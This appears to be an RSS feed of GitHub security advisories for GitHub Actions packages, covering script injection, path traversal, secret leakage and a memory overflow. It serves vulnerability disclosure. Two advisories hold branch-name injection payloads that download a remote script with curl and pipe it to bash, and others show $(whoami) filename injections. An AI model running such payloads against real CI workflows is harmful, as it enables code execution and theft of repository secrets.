<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/actions.rss</id>
    <title>Security Advisory for Github Actions</title>
    <updated>2024-09-05T02:19:40.565Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aactions"/>
    <subtitle>Security Advisory for Github Actions on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[actions/download-artifact] @actions/download-artifact has an Arbitrary File Write via artifact extraction]]></title>
        <id>https://github.com/advisories/GHSA-cxww-7g56-2vh6</id>
        <link href="https://github.com/advisories/GHSA-cxww-7g56-2vh6"/>
        <updated>2024-09-04T18:08:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Versions of <code>actions/download-artifact</code> before 4.1.7 are vulnerable to arbitrary file write when downloading and extracting a specifically crafted artifact that contains path traversal filenames.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to version 4.1.7 or higher. Alternatively use 'v4' tag which points to the latest and secure version.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
<li><a href="https://github.com/actions/download-artifact/releases/tag/v4.1.7">https://github.com/actions/download-artifact/releases/tag/v4.1.7</a></li>
</ul>
<h3 id="cve">CVE</h3>
<p>CVE-2024-42471</p>
<h3 id="credits">Credits</h3>
<p>Justin Taft from Google</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/actions/download-artifact/security/advisories/GHSA-cxww-7g56-2vh6">https://github.com/actions/download-artifact/security/advisories/GHSA-cxww-7g56-2vh6</a></li>
<li><a href="https://github.com/actions/download-artifact/releases/tag/v4.1.7">https://github.com/actions/download-artifact/releases/tag/v4.1.7</a></li>
<li><a href="https://github.com/advisories/GHSA-6q32-hq47-5qq3">https://github.com/advisories/GHSA-6q32-hq47-5qq3</a></li>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
<li><a href="https://github.com/advisories/GHSA-cxww-7g56-2vh6">https://github.com/advisories/GHSA-cxww-7g56-2vh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cxww-7g56-2vh6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T20:55:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ultralytics/actions] GitHub Actions Script Injection in `ultralytics/actions`]]></title>
        <id>https://github.com/advisories/GHSA-7x29-qqmq-v6qc</id>
        <link href="https://github.com/advisories/GHSA-7x29-qqmq-v6qc"/>
        <updated>2024-08-14T20:53:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Ultralytics action available at <a href="https://github.com/marketplace/actions/ultralytics-actions">https://github.com/marketplace/actions/ultralytics-actions</a> is vulnerable to GitHub Actions script injection. If anyone uses the action within a workflow that runs on the <code>pull_request_target</code> trigger, then an attacker can inject arbitrary code into that workflow using a crafted branch name.</p>
<h3 id="details">Details</h3>
<p>The issue exists because the <code>action.yml</code> is a composite action and uses certain fields by GitHub context expression within a <code>run</code> step:</p>
<pre><code>        echo "github.event.pull_request.head.ref: ${{ github.event.pull_request.head.ref }}"
        echo "github.ref: ${{ github.ref }}"
        echo "github.head_ref: ${{ github.head_ref }}"
        echo "github.base_ref: ${{ github.base_ref }}"
</code></pre>
<p>In this case, <code>github.head_ref</code> and <code>github.event.pull_request.head.ref</code> are user controlled and can be used to inject code.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Create a fork of any repository that uses <code>ultralytics/actions</code> within a workflow that runs on <code>pull_request_target</code>.</p>
</li>
<li><p>In the fork create a branch as an injection payload, e.g.: <code>Hacked";{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/6dc549d083b2da1a54d22cc4feac53a4/raw/4b7499772c53085aeedf459d822aee277b5f17a0/poc.sh}${IFS}|${IFS}bash</code></p>
</li>
<li><p>Create a draft pull request.</p>
</li>
<li><p>If the action is reachable, then achieve arbitrary code execution.</p>
</li>
</ol>
<p><img alt="ultra_cve_poc" src="https://github.com/ultralytics/actions/assets/2006441/b865a54c-38b5-451c-8e93-c497ad6874a2"></p>
<p>See my full POC here (<a href="https://github.com/AdnaneKhan/Ultralytics_POC/actions/runs/9733997201">https://github.com/AdnaneKhan/Ultralytics_POC/actions/runs/9733997201</a> and <a href="https://github.com/AdnaneKhan/Ultralytics_POC">https://github.com/AdnaneKhan/Ultralytics_POC</a>), where I created a test workflow that used the action and achieved arbitrary execution using another account by creating a pull request from a fork.</p>
<h3 id="impact">Impact</h3>
<p>Any workflow that uses the action and runs on <code>pull_request_target</code> is vulnerable to arbitrary code execution within the context of the base branch. An attacker can use this to abuse the <code>GITHUB_TOKEN</code> or steal secrets from the workflow.</p>
<h3 id="fix">Fix</h3>
<p>Sanitize the user-controlled variables using environment vars.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc">https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc</a></li>
<li><a href="https://github.com/ultralytics/actions/commit/8069e0ac4c23170f308ea6985783e64ca4a7900a">https://github.com/ultralytics/actions/commit/8069e0ac4c23170f308ea6985783e64ca4a7900a</a></li>
<li><a href="https://github.com/advisories/GHSA-7x29-qqmq-v6qc">https://github.com/advisories/GHSA-7x29-qqmq-v6qc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7x29-qqmq-v6qc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-08-14T20:53:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fish-shop/syntax-check] fish-shop/syntax-check Improper Neutralization of Delimiters]]></title>
        <id>https://github.com/advisories/GHSA-xj87-mqvh-88w2</id>
        <link href="https://github.com/advisories/GHSA-xj87-mqvh-88w2"/>
        <updated>2024-08-12T19:17:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper neutralisation of delimiters in the <code>pattern</code> input (specifically the command separator <code>;</code> and command substitution characters <code>(</code> and <code>)</code>) mean that arbitrary command injection is possible by modification of the input value used in a workflow. This has the potential for exposure or exfiltration of sensitive information from the workflow runner, such as might be achieved by sending environment variables to an external entity.</p>
<h3 id="patches">Patches</h3>
<p>As of this writing, the issue has been patched for versions in the <code>v1.x.x</code> release series in release <code>v1.6.12</code> (also tagged as <code>v1.6</code> and <code>v1</code>). The latest available release <code>v2.0.0</code> also includes a corresponding patch (also tagged as <code>v2.0</code> and <code>v2</code>).</p>
<p>Users should upgrade to at least the patched version <code>v1.6.12</code> or preferably the latest available version <code>v2.0.0</code>. Workflows that use the action ref <code>v1</code> will automatically receive the patched version <code>v1.6.12</code> in future workflow runs.</p>
<p>Patch summary:</p>
<table>
<thead>
<tr>
<th>Release series</th>
<th>Patched tags</th>
<th>Patched commit hashes</th>
</tr>
</thead>
<tbody><tr>
<td><code>1.x.x</code></td>
<td><code>v1.6.12</code>, <code>v1.6</code>, <code>v1</code></td>
<td><code>91e6817c48ad475542fe4e78139029b036a53b03</code></td>
</tr>
<tr>
<td><code>2.x.x</code></td>
<td><code>v2.0.0</code>, <code>v2.0</code>, <code>v2</code></td>
<td><code>c2cb11395e21119ff8d6e7ea050430ee7d6f49ca</code></td>
</tr>
</tbody></table>
<h3 id="workarounds">Workarounds</h3>
<p>Is it recommended that users update to the patched version <code>v1.6.12</code> or the latest release version <code>v2.0.0</code>, however remediation may be possible through careful control of workflows and the <code>pattern</code> input value used by this action.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/140.html">CWE-140: Improper Neutralization of Delimiters</a></li>
<li><a href="https://capec.mitre.org/data/definitions/15.html">CAPEC-15: Command Delimiters</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fish-shop/syntax-check/security/advisories/GHSA-xj87-mqvh-88w2">https://github.com/fish-shop/syntax-check/security/advisories/GHSA-xj87-mqvh-88w2</a></li>
<li><a href="https://github.com/fish-shop/syntax-check/commit/91e6817c48ad475542fe4e78139029b036a53b03">https://github.com/fish-shop/syntax-check/commit/91e6817c48ad475542fe4e78139029b036a53b03</a></li>
<li><a href="https://github.com/fish-shop/syntax-check/commit/c2cb11395e21119ff8d6e7ea050430ee7d6f49ca">https://github.com/fish-shop/syntax-check/commit/c2cb11395e21119ff8d6e7ea050430ee7d6f49ca</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42482">https://nvd.nist.gov/vuln/detail/CVE-2024-42482</a></li>
<li><a href="https://github.com/advisories/GHSA-xj87-mqvh-88w2">https://github.com/advisories/GHSA-xj87-mqvh-88w2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xj87-mqvh-88w2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-12T18:25:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rlespinasse/github-slug-action] github-slug-action use of `set-env` Runner commands which are processed via stdout]]></title>
        <id>https://github.com/advisories/GHSA-7f32-hm4h-w77q</id>
        <link href="https://github.com/advisories/GHSA-7f32-hm4h-w77q"/>
        <updated>2024-02-03T00:22:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This GitHub Action use <code>set-env</code> runner commands which are processed via stdout related to GHSA-mfwh-5m23-j46w</p>
<h3 id="patches">Patches</h3>
<p>The following versions use the recommended <a href="https://github.com/actions/toolkit/blob/main/docs/commands.md#environment-files">Environment File Syntax</a>.</p>
<ul>
<li>2.1.1</li>
<li>1.1.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>None, it is strongly suggested that you upgrade as soon as possible.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/rlespinasse/github-slug-action">rlespinasse/github-slug-action</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q">https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q</a></li>
<li><a href="https://github.com/advisories/GHSA-7f32-hm4h-w77q">https://github.com/advisories/GHSA-7f32-hm4h-w77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f32-hm4h-w77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-03T00:22:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rlespinasse/github-slug-action] github-slug-action use of `set-env` Runner commands which are processed via stdout]]></title>
        <id>https://github.com/advisories/GHSA-7f32-hm4h-w77q</id>
        <link href="https://github.com/advisories/GHSA-7f32-hm4h-w77q"/>
        <updated>2024-02-03T00:22:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This GitHub Action use <code>set-env</code> runner commands which are processed via stdout related to GHSA-mfwh-5m23-j46w</p>
<h3 id="patches">Patches</h3>
<p>The following versions use the recommended <a href="https://github.com/actions/toolkit/blob/main/docs/commands.md#environment-files">Environment File Syntax</a>.</p>
<ul>
<li>2.1.1</li>
<li>1.1.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>None, it is strongly suggested that you upgrade as soon as possible.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/rlespinasse/github-slug-action">rlespinasse/github-slug-action</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q">https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q</a></li>
<li><a href="https://github.com/advisories/GHSA-7f32-hm4h-w77q">https://github.com/advisories/GHSA-7f32-hm4h-w77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f32-hm4h-w77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-03T00:22:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hashicorp/vault-action] Vault GitHub Action did not correctly mask multi-line secrets in output]]></title>
        <id>https://github.com/advisories/GHSA-4mgv-m5cm-f9h7</id>
        <link href="https://github.com/advisories/GHSA-4mgv-m5cm-f9h7"/>
        <updated>2024-01-25T19:58:48.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp vault-action (aka Vault GitHub Action) before 2.2.0 allows attackers to obtain sensitive information from log files because a multi-line secret was not correctly registered with GitHub Actions for log masking.</p>
<p>The vault-action implementation did not correctly handle the marking of multi-line variables. As a result, multi-line secrets were not correctly masked in vault-action output.</p>
<p>Remediation:
Customers using vault-action should evaluate the risk associated with this issue, and consider upgrading to vault-action 2.2.0 or newer. Please refer to <a href="https://github.com/marketplace/actions/hashicorp-vault">https://github.com/marketplace/actions/hashicorp-vault</a> for more information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32074">https://nvd.nist.gov/vuln/detail/CVE-2021-32074</a></li>
<li><a href="https://github.com/hashicorp/vault-action/issues/205">https://github.com/hashicorp/vault-action/issues/205</a></li>
<li><a href="https://github.com/hashicorp/vault-action/pull/208">https://github.com/hashicorp/vault-action/pull/208</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2021-13-vault-github-action-did-not-correctly-mask-multi-line-secrets-in-output/24128">https://discuss.hashicorp.com/t/hcsec-2021-13-vault-github-action-did-not-correctly-mask-multi-line-secrets-in-output/24128</a></li>
<li><a href="https://github.com/hashicorp/vault-action/blob/master/CHANGELOG.md">https://github.com/hashicorp/vault-action/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/hashicorp/vault-action/commit/3526e1be65cf8faf42d6088bc5da8bff596c718a">https://github.com/hashicorp/vault-action/commit/3526e1be65cf8faf42d6088bc5da8bff596c718a</a></li>
<li><a href="https://github.com/advisories/GHSA-4mgv-m5cm-f9h7">https://github.com/advisories/GHSA-4mgv-m5cm-f9h7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mgv-m5cm-f9h7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T19:01:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tj-actions/verify-changed-files] Potential Actions command injection in output filenames (GHSL-2023-275)]]></title>
        <id>https://github.com/advisories/GHSA-ghm2-rq8q-wrhc</id>
        <link href="https://github.com/advisories/GHSA-ghm2-rq8q-wrhc"/>
        <updated>2024-01-10T19:11:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://github.com/tj-actions/verify-changed-files"><code>tj-actions/verify-changed-files</code></a> action allows for command injection in changed filenames, allowing an attacker to execute arbitrary code and potentially leak secrets.</p>
<h3 id="details">Details</h3>
<p>The <a href="https://github.com/tj-actions/verify-changed-files"><code>verify-changed-files</code></a> workflow returns the list of files changed within a workflow execution.</p>
<p>This could potentially allow filenames that contain special characters such as <code>;</code> and ` (backtick) which can be used by an attacker to take over the <a href="https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners">GitHub Runner</a> if the output value is used in a raw fashion (thus being directly replaced before execution) inside a <code>run</code> block. By running custom commands an attacker may be able to steal **secrets** such as <code>GITHUB_TOKEN</code> if triggered on other events than <code>pull_request</code>. For example on <code>push</code>.</p>
<h4 id="proof-of-concept">Proof of Concept</h4>
<ol>
<li>Submit a pull request to the repository with a new file injecting a command. For example <code>$(whoami).txt</code> would be a valid filename.</li>
<li>Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request filename will flow into the <code>List all changed files tracked and untracked files</code> step.</li>
</ol>
<pre><code class="language-yaml">- name: List all changed files tracked and untracked files
  run: |
    echo "Changed files: ${{ steps.verify-changed-files.outputs.changed_files }}"
</code></pre>
<p>Example output:</p>
<pre><code class="language-yaml">##[group]Run echo "Changed files: $(whoami).txt"
  echo "Changed files: $(whoami).txt"[0m
shell: /usr/bin/bash -e {0}
##[endgroup]
Changed files: runner.txt
</code></pre>
<h3 id="impact">Impact</h3>
<p>This issue may lead to arbitrary command execution in the GitHub Runner.</p>
<h3 id="resolution">Resolution</h3>
<ul>
<li><p>A new <code>safe_output</code> input would be enabled by default and return filename paths escaping special characters like ;, ` (backtick), $, (), etc for bash environments.</p>
</li>
<li><p>A safe recommendation of using environment variables to store unsafe outputs.</p>
</li>
</ul>
<pre><code class="language-yaml">- name: List all changed files tracked and untracked files
  env:
     CHANGED_FILES: ${{ steps.verify-changed-files.outputs.changed_files }}
  run: |
    echo "Changed files: $CHANGED_FILES"
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input/">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tj-actions/verify-changed-files/security/advisories/GHSA-ghm2-rq8q-wrhc">https://github.com/tj-actions/verify-changed-files/security/advisories/GHSA-ghm2-rq8q-wrhc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-52137">https://nvd.nist.gov/vuln/detail/CVE-2023-52137</a></li>
<li><a href="https://github.com/tj-actions/verify-changed-files/commit/498d3f316f501aa72485060e8c96fde7b2014f12">https://github.com/tj-actions/verify-changed-files/commit/498d3f316f501aa72485060e8c96fde7b2014f12</a></li>
<li><a href="https://github.com/tj-actions/verify-changed-files/commit/592e305da041c09a009afa4a43c97d889bed65c3">https://github.com/tj-actions/verify-changed-files/commit/592e305da041c09a009afa4a43c97d889bed65c3</a></li>
<li><a href="https://github.com/advisories/GHSA-ghm2-rq8q-wrhc">https://github.com/advisories/GHSA-ghm2-rq8q-wrhc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ghm2-rq8q-wrhc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-02T16:42:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tj-actions/changed-files] tj-actions/changed-files has Potential Actions command injection in output filenames (GHSL-2023-271)]]></title>
        <id>https://github.com/advisories/GHSA-mcph-m25j-8j63</id>
        <link href="https://github.com/advisories/GHSA-mcph-m25j-8j63"/>
        <updated>2024-01-04T19:43:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>tj-actions/changed-files</code> workflow allows for command injection in changed filenames, allowing an attacker to execute arbitrary code and potentially leak secrets.</p>
<h3 id="details">Details</h3>
<p>The <a href="https://github.com/tj-actions/changed-files"><code>changed-files</code></a> action returns a list of files changed in a commit or pull request which provides an <code>escape_json</code> input <a href="https://github.com/tj-actions/changed-files/blob/94549999469dbfa032becf298d95c87a14c34394/action.yml#L136">enabled by default</a>, only escapes <code>"</code> for JSON values. </p>
<p>This could potentially allow filenames that contain special characters such as <code>;</code> and ` (backtick) which can be used by an attacker to take over the <a href="https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners">GitHub Runner</a> if the output value is used in a raw fashion (thus being directly replaced before execution) inside a <code>run</code> block. By running custom commands an attacker may be able to steal **secrets** such as <code>GITHUB_TOKEN</code> if triggered on other events than <code>pull_request</code>. For example on <code>push</code>.</p>
<h4 id="proof-of-concept">Proof of Concept</h4>
<ol>
<li>Submit a pull request to a repository with a new file injecting a command. For example <code>$(whoami).txt</code> which is a valid filename.</li>
<li>Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request filename will flow into the <code>List all changed files</code> step below.</li>
</ol>
<pre><code class="language-yaml">      - name: List all changed files
        run: |
          for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
            echo "$file was changed"
          done
</code></pre>
<p>Example output:</p>
<pre><code class="language-yaml">##[group]Run for file in $(whoami).txt; do
    for file in $(whoami).txt; do
        echo "$file was changed"
    done
shell: /usr/bin/bash -e {0}
##[endgroup]
runner.txt was changed
</code></pre>
<h3 id="impact">Impact</h3>
<p>This issue may lead to arbitrary command execution in the GitHub Runner.</p>
<h3 id="resolution">Resolution</h3>
<ul>
<li><p>A new <code>safe_output</code> input would be enabled by default and return filename paths escaping special characters like ;, ` (backtick), $, (), etc for bash environments.</p>
</li>
<li><p>A safe recommendation of using environment variables to store unsafe outputs.</p>
</li>
</ul>
<pre><code class="language-yaml">- name: List all changed files
  env:
    ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}
  run: |
    for file in "$ALL_CHANGED_FILES"; do
      echo "$file was changed"
    done
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input/">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63">https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-51664">https://nvd.nist.gov/vuln/detail/CVE-2023-51664</a></li>
<li><a href="https://github.com/tj-actions/changed-files/commit/0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b">https://github.com/tj-actions/changed-files/commit/0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b</a></li>
<li><a href="https://github.com/tj-actions/changed-files/commit/716b1e13042866565e00e85fd4ec490e186c4a2f">https://github.com/tj-actions/changed-files/commit/716b1e13042866565e00e85fd4ec490e186c4a2f</a></li>
<li><a href="https://github.com/tj-actions/changed-files/commit/ff2f6e6b91913a7be42be1b5917330fe442f2ede">https://github.com/tj-actions/changed-files/commit/ff2f6e6b91913a7be42be1b5917330fe442f2ede</a></li>
<li><a href="https://github.com/advisories/GHSA-mcph-m25j-8j63">https://github.com/advisories/GHSA-mcph-m25j-8j63</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mcph-m25j-8j63</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-02T16:41:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[afichet/openexr-viewer] memory overflow vulnerability in OpenEXR-viewer]]></title>
        <id>https://github.com/advisories/GHSA-99jg-r3f4-rpxj</id>
        <link href="https://github.com/advisories/GHSA-99jg-r3f4-rpxj"/>
        <updated>2023-12-12T13:20:31.000Z</updated>
        <content type="html"><![CDATA[<p>Just open this exr file through openexr-viewer.</p>
<p>( poc send by email )</p>
<p>This is windbg log file.</p>
<p>[ POC 2 ]
(8660.7e44): Access violation - code c0000005 (!!! second chance !!!)
openexr_viewer+0x27be4:
00007ff7<code>13ff7be4 c744880c0000803f mov     dword ptr [rax+rcx*4+0Ch],3F800000h ds:0000020a</code>3ac8000c=????????</p>
<p>Attempt to write the value 1.0 to the memory address 0x20A3AC8000C</p>
<p>[ POC 1 ]
(1404.9264): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
openexr_viewer+0x27be4:
00007ff7<code>13ff7be4 c744880c0000803f mov     dword ptr [rax+rcx*4+0Ch],3F800000h ds:0000029c</code>b371600c=????????</p>
<p>Attempt to write the value 1.0 to the memory address 0x29CB371600C</p>
<p>Credits
Team : ZeroPointer
이동하 ( Lee Dong Ha of ZeroPointer Lab )
정지민 &nbsp;&nbsp;&nbsp;( Jeong Jimin of ZeroPointer Lab )
박우진&nbsp;&nbsp;&nbsp; ( Park Woojin of ZeroPointer Lab )
전우진&nbsp;&nbsp;&nbsp; ( Jeon Woojin of ZeroPointer Lab )</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/afichet/openexr-viewer/security/advisories/GHSA-99jg-r3f4-rpxj">https://github.com/afichet/openexr-viewer/security/advisories/GHSA-99jg-r3f4-rpxj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-50245">https://nvd.nist.gov/vuln/detail/CVE-2023-50245</a></li>
<li><a href="https://github.com/afichet/openexr-viewer/commit/d0a7e85dfeb519951fb8a8d70f73f30d41cdd3d9">https://github.com/afichet/openexr-viewer/commit/d0a7e85dfeb519951fb8a8d70f73f30d41cdd3d9</a></li>
<li><a href="https://github.com/advisories/GHSA-99jg-r3f4-rpxj">https://github.com/advisories/GHSA-99jg-r3f4-rpxj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-99jg-r3f4-rpxj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-12-12T13:20:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tj-actions/branch-names] tj-actions/branch-names's Improper Sanitization of Branch Name Leads to Arbitrary Code Injection]]></title>
        <id>https://github.com/advisories/GHSA-8v8w-v8xg-79rf</id>
        <link href="https://github.com/advisories/GHSA-8v8w-v8xg-79rf"/>
        <updated>2023-12-07T13:50:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>tj-actions/branch-names</code> GitHub Actions references the <code>github.event.pull_request.head.ref</code> and <code>github.head_ref</code> context variables within a GitHub Actions <code>run</code> step. The head ref variable is the branch name and can be used to execute arbitrary code using a specially crafted branch name.</p>
<h3 id="details">Details</h3>
<p>The vulnerable code is within the <code>action.yml</code> file the <code>run</code> step references the value directly, instead of a sanitized variable.</p>
<pre><code class="language-yml">runs:
  using: "composite"
  steps:
    - id: branch
      run: |
        # "Set branch names..."
        if [[ "${{ github.ref }}" != "refs/tags/"* ]]; then
          BASE_REF=$(printf "%q" "${{ github.event.pull_request.base.ref || github.base_ref }}")
          HEAD_REF=$(printf "%q" "${{ github.event.pull_request.head.ref || github.head_ref }}")
          REF=$(printf "%q" "${{ github.ref }}")
</code></pre>
<p>An attacker can use a branch name to inject arbitrary code, for example: <code>Test")${IFS}&amp;&amp;${IFS}{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/72511291630c7f95f0d8ffabb3c80fbf/raw/inject.sh}${IFS}|${IFS}bash&amp;&amp;echo${IFS}$("foo</code> will download and run a script from a Gist. This allows an attacker to inject a payload of arbitrary complexity.</p>
<h3 id="impact">Impact</h3>
<p>An attacker can use this vulnerability to steal secrets from or abuse <code>GITHUB_TOKEN</code> permissions.</p>
<h3 id="reference">Reference</h3>
<ul>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input">https://securitylab.github.com/research/github-actions-untrusted-input</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tj-actions/branch-names/security/advisories/GHSA-8v8w-v8xg-79rf">https://github.com/tj-actions/branch-names/security/advisories/GHSA-8v8w-v8xg-79rf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49291">https://nvd.nist.gov/vuln/detail/CVE-2023-49291</a></li>
<li><a href="https://github.com/tj-actions/branch-names/commit/4923d1ca41f928c24f1c1b3af9daaadfb71e6337">https://github.com/tj-actions/branch-names/commit/4923d1ca41f928c24f1c1b3af9daaadfb71e6337</a></li>
<li><a href="https://github.com/tj-actions/branch-names/commit/6c999acf206f5561e19f46301bb310e9e70d8815">https://github.com/tj-actions/branch-names/commit/6c999acf206f5561e19f46301bb310e9e70d8815</a></li>
<li><a href="https://github.com/tj-actions/branch-names/commit/726fe9ba5e9da4fcc716223b7994ffd0358af060">https://github.com/tj-actions/branch-names/commit/726fe9ba5e9da4fcc716223b7994ffd0358af060</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input">https://securitylab.github.com/research/github-actions-untrusted-input</a></li>
<li><a href="https://github.com/advisories/GHSA-8v8w-v8xg-79rf">https://github.com/advisories/GHSA-8v8w-v8xg-79rf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8v8w-v8xg-79rf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-12-05T23:30:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rlespinasse/github-slug-action] github-slug-action vulnerable to arbitrary code execution]]></title>
        <id>https://github.com/advisories/GHSA-6q4m-7476-932w</id>
        <link href="https://github.com/advisories/GHSA-6q4m-7476-932w"/>
        <updated>2024-04-16T11:46:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This action uses the <code>github.head_ref</code> parameter in an insecure way. </p>
